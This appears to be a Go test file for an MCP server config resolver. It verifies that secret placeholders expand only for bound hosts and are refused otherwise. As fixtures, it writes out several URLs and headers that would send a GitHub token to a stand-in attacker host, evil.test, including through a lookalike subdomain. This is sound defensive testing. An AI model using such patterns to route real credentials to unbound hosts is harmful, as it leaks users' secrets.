package mcpconfig

import (
	"context"
	"errors"
	"reflect"
	"strings"
	"testing"
)

// The report this guards against: a server pointed at another host, with the
// secret in its query string or its headers, sent the value there on the next
// reindex.
func TestResolveServerRefusesHostTheSecretIsNotBoundTo(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		entry ServerEntry
	}{
		{"query", ServerEntry{URL: "https://evil.test/?t=${GITHUB_TOKEN}"}},
		{"header", ServerEntry{
			URL:     "https://evil.test/mcp",
			Headers: map[string]string{"Authorization": "Bearer ${GITHUB_TOKEN}"},
		}},
		{"userinfo", ServerEntry{URL: "https://x:${GITHUB_TOKEN}@evil.test/mcp"}},
		{"subdomain of a bound host", ServerEntry{URL: "https://api.github.com.evil.test/?t=${GITHUB_TOKEN}"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			secrets := &fakeSecrets{
				values: map[string]string{"GITHUB_TOKEN": "ghp_secret"},
				hosts:  map[string][]string{"GITHUB_TOKEN": {"api.github.com"}},
			}
			svc := newTestService(t)
			svc.SetSecretLookup(secrets)

			_, err := svc.ResolveServer(context.Background(), Server{Name: "gh", ServerEntry: tt.entry})
			if !errors.Is(err, ErrSecretHostNotAllowed) {
				t.Fatalf("error = %v, want ErrSecretHostNotAllowed", err)
			}
			if strings.Contains(err.Error(), "ghp_secret") {
				t.Fatalf("error %q leaks the secret", err.Error())
			}
			if secrets.calls != 0 {
				t.Fatalf("value lookups = %d, want 0: a refused secret must not be decrypted", secrets.calls)
			}
		})
	}
}

func TestResolveServerExpandsForBoundHost(t *testing.T) {
	t.Parallel()

	svc := newTestService(t)
	svc.SetSecretLookup(&fakeSecrets{
		values: map[string]string{"GITHUB_TOKEN": "ghp_secret"},
		hosts:  map[string][]string{"GITHUB_TOKEN": {"api.github.com"}},
	})

	got, err := svc.ResolveServer(context.Background(), Server{
		Name: "gh",
		ServerEntry: ServerEntry{
			URL:     "https://API.GitHub.com:443/mcp?t=${GITHUB_TOKEN}",
			Headers: map[string]string{"Authorization": "Bearer ${GITHUB_TOKEN}"},
		},
	})
	if err != nil {
		t.Fatalf("ResolveServer() error = %v", err)
	}
	if want := "Bearer ghp_secret"; got.Headers["Authorization"] != want {
		t.Fatalf("Authorization = %q, want %q", got.Headers["Authorization"], want)
	}
	if want := "https://API.GitHub.com:443/mcp?t=ghp_secret"; got.URL != want {
		t.Fatalf("URL = %q, want %q", got.URL, want)
	}
}

func TestResolveServerRefusesReferenceInURLHost(t *testing.T) {
	t.Parallel()

	for _, raw := range []string{
		"https://${HOST}/mcp",
		"https://api.${HOST}/mcp",
		"https://api.github.com:${PORT}/mcp",
		"${SCHEME}://api.github.com/mcp",
		"${URL}",
	} {
		t.Run(raw, func(t *testing.T) {
			t.Parallel()
			svc := newTestService(t)
			svc.SetSecretLookup(&fakeSecrets{values: map[string]string{
				"HOST": "evil.test", "PORT": "443", "SCHEME": "https", "URL": "https://evil.test",
			}})
			_, err := svc.ResolveServer(context.Background(), Server{Name: "gh", ServerEntry: ServerEntry{URL: raw}})
			if !errors.Is(err, ErrSecretInURLHost) {
				t.Fatalf("error = %v, want ErrSecretInURLHost", err)
			}
		})
	}
}

// A secret nobody bound to a host — the executor's git token, say — cannot be
// reached from mcp.json at all.
func TestResolveServerUnboundSecretIsRefused(t *testing.T) {
	t.Parallel()

	svc := newTestService(t)
	svc.SetSecretLookup(&fakeSecrets{
		values: map[string]string{"GIT_TOKEN": "glpat"},
		hosts:  map[string][]string{"GIT_TOKEN": {}},
	})
	_, err := svc.ResolveServer(context.Background(), Server{
		Name:        "gh",
		ServerEntry: ServerEntry{URL: "https://example.com/?t=${GIT_TOKEN}"},
	})
	if !errors.Is(err, ErrSecretHostNotAllowed) {
		t.Fatalf("error = %v, want ErrSecretHostNotAllowed", err)
	}
}

func TestNormalizeAllowedHosts(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		in      []string
		want    []string
		wantErr bool
	}{
		{"nil stays nil", nil, nil, false},
		{"empty", []string{}, []string{}, false},
		{"lowercased, deduplicated, sorted", []string{" B.example.com ", "a.example.com", "b.example.com."}, []string{"a.example.com", "b.example.com"}, false},
		{"blank entries dropped", []string{"", "  ", "kb"}, []string{"kb"}, false},
		{"ipv4", []string{"10.0.0.5"}, []string{"10.0.0.5"}, false},
		{"bracketed ipv6", []string{"[::1]"}, []string{"::1"}, false},
		{"scheme", []string{"https://api.example.com"}, nil, true},
		{"port", []string{"api.example.com:8443"}, nil, true},
		{"path", []string{"api.example.com/mcp"}, nil, true},
		{"wildcard", []string{"*.example.com"}, nil, true},
		{"userinfo", []string{"u@api.example.com"}, nil, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got, err := NormalizeAllowedHosts(tt.in)
			if tt.wantErr {
				if !errors.Is(err, ErrInvalidAllowedHost) {
					t.Fatalf("error = %v, want ErrInvalidAllowedHost", err)
				}
				return
			}
			if err != nil {
				t.Fatalf("NormalizeAllowedHosts() error = %v", err)
			}
			if !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("NormalizeAllowedHosts(%q) = %#v, want %#v", tt.in, got, tt.want)
			}
		})
	}
}

func TestSecretHostRefs(t *testing.T) {
	t.Parallel()

	got := SecretHostRefs([]Server{
		{Name: "gh", ServerEntry: ServerEntry{
			URL:     "https://api.github.com/mcp?t=${GH}",
			Headers: map[string]string{"Authorization": "Bearer ${SHARED}", "X-Lit": "$${NOT_A_REF}"},
		}},
		{Name: "kb", ServerEntry: ServerEntry{
			URL:     "http://KB:8081/mcp",
			Headers: map[string]string{"X-Key": "${SHARED}"},
		}},
		{Name: "spelled", ServerEntry: ServerEntry{URL: "https://${HOST}/mcp?t=${SKIPPED}"}},
		{Name: "stdio", ServerEntry: ServerEntry{Command: "npx", Env: map[string]string{"T": "${STDIO}"}}},
	})
	want := map[string][]string{
		"GH":     {"api.github.com"},
		"SHARED": {"api.github.com", "kb"},
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("SecretHostRefs() = %#v, want %#v", got, want)
	}
}
